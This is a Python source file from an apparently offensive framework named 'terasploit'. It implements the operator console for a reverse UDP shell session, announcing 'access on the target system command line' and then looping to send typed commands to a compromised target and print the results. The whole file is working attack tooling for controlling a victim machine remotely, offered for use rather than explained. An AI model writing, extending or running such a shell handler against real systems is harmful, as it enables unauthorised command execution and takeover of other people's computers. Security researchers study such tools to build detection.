#######
# Session: Reverse UDP
#######

import sys
import time

from libs.terasploit.framework.exploit.client import Session
from init.framework import Decode
from init.teralib.ui import (
    line_feed,
    s,
    print_info
)
from init.teralib.base import (
    TerasploitTerminateSession,
    TerasploitException
)

class session_shell:
    
    def __init__(self) -> None:
        print_info (f"session started {time.strftime('%Z %H:%M:%S - %A, %B %e, %Y')}")
        print (f"{line_feed()}Welcome to terasploit shell, you have access on the target system command line.{line_feed()}")
        self.command_prompt()
        
    
    def carriage_return(self):
        sys.stdout.write('\r')
        sys.stdout.flush()
        
    
    def exit_shell(self):
        Session.client.close()
        setattr(Session,'client',None)
        setattr(Session,'received_connection',None)
        raise TerasploitTerminateSession('exit','the shell session is done.')


    def output(self,content) -> None:
        for i in [content,"\b\r"," "*80]:
            sys.stdout.write(i)
        sys.stdout.flush()
       
    
    def command_prompt(self):
        while True:
            try:
                self.carriage_return()
                command = input(f'\001{s.UNDERLINE}\002shell\001{s.RESET_ALL}\002 > ')
                if command == 'exit':
                    self.exit_shell()

                command = command + '\n'
                Session.client.send(command.encode())
                time.sleep(1)
                self.output(Decode(Session.client))
                
            except KeyboardInterrupt:
                continue
            
            except TerasploitException:
                return
            
            except Exception as error:
                print_info (error,type='red')